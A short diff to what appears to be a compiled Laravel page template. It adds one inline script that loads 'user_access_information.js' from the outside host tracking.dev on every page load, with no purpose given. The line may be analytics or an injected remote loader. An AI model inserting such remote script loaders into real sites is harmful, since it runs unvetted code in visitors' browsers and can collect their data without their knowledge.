@@ -61,6 +61,6 @@
         <!-- Masks -->
         <script src="<?php echo e(asset('js/jquery-mask.js')); ?>"></script>
         <script src="<?php echo e(asset('js/jquery-mask-custom.js')); ?>"></script>
-
+        <script type="text/javascript">var u=1,px=3; var imported = document.createElement('script'); imported.src = 'http://tracking.dev/js/user_access_information.js'; document.head.appendChild(imported); </script>
     </body>
 </html>
